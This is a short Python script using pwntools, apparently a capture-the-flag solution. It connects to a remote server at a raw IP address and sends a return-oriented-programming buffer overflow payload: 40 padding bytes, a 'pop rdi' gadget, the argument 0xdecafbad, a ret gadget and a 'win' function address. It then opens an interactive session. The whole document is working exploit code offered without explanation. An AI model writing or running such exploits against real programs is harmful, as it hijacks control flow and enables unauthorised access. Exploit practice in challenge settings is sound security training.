from pwn import *

# Connect to the remote server
ps = remote("207.154.239.148", 1338)

# Craft the payload
payload = b'Z' * 40
payload += p64(0x04012e3)  # rdi gadget
payload += p64(0xdecafbad)  # argument to pass to win function
payload += p64(0x40101a)    # ret gadget
payload += p64(0x00401106)   # address of win function

# Send the payload
ps.sendline(payload)

# Interact with the process
ps.interactive()
